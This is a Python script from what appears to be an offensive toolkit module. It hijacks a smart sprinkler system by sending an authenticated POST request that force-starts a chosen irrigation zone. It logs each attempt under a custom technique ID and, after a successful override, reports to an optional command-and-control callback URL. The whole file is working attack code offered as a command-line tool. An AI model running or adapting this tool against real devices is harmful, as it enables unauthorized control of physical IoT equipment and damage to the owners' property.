# modules/exploits/sprinkler_zone_hijacker.py

import argparse
import json
import os
from datetime import datetime
import requests

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T8211"  # Custom entry: IoT Actuator Override

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def override_schedule(endpoint, token, zone_id, duration, c2=None):
    payload = {
        "zone_id": zone_id,
        "duration": duration,
        "start": "now"
    }
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    try:
        response = requests.post(f"{endpoint}/api/zone/start", json=payload, headers=headers)
        status = response.status_code
        success = status == 200
    except Exception as e:
        success = False
        status = str(e)

    log_event({
        "timestamp": datetime.utcnow().isoformat(),
        "endpoint": endpoint,
        "zone_id": zone_id,
        "duration": duration,
        "success": success,
        "ttp": MITRE_TTP
    })

    if success and c2:
        requests.post(c2, json={"event": "sprinkler_override", "zone": zone_id})

    return success

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Smart Sprinkler Zone Hijacker")
    parser.add_argument("--endpoint", required=True, help="Sprinkler API base URL")
    parser.add_argument("--token", required=True, help="API Bearer token")
    parser.add_argument("--zone", required=True, help="Zone ID to activate")
    parser.add_argument("--duration", default=300, type=int, help="Duration in seconds")
    parser.add_argument("--c2", help="Optional C2 callback URL")
    args = parser.parse_args()

    success = override_schedule(args.endpoint, args.token, args.zone, args.duration, args.c2)
    if success:
        print(f"[âœ“] Zone {args.zone} activated for {args.duration}s")
    else:
        print("[!] Override failed")
